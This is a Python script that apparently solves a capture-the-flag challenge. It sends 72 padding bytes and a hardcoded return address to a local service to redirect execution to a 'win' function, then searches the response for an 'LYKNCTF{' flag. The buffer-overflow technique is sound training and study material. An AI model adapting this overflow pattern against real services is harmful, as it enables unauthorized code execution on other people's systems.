import argparse
import socket
import struct
import sys

OFFSET = 72
WIN_ADDR = 0x4011b6  # address of win in the compiled binary
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9001


def build_payload():
    return b"A" * OFFSET + struct.pack("<Q", WIN_ADDR)


def recv_all(sock):
    chunks = []
    sock.settimeout(2.0)
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            chunks.append(chunk)
    except socket.timeout:
        pass
    return b"".join(chunks)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    args = parser.parse_args()

    payload = build_payload()

    try:
        with socket.create_connection((args.host, args.port), timeout=5) as sock:
            sock.settimeout(2.0)
            banner = sock.recv(4096)
            sock.sendall(payload)
            sock.shutdown(socket.SHUT_WR)
            out = banner + recv_all(sock)
    except ConnectionRefusedError:
        print(f"[-] Could not connect to {args.host}:{args.port}", file=sys.stderr)
        return 1
    except TimeoutError:
        print(f"[-] Timed out while connecting to {args.host}:{args.port}", file=sys.stderr)
        return 1

    sys.stdout.buffer.write(out)

    text = out.decode("latin-1", errors="ignore")
    for line in text.splitlines():
        if "LYKNCTF{" in line:
            print(f"\n[+] Flag recovered: {line.strip()}")
            return 0

    print("\n[-] No flag in output", file=sys.stderr)
    return 1


if __name__ == "__main__":
    sys.exit(main())
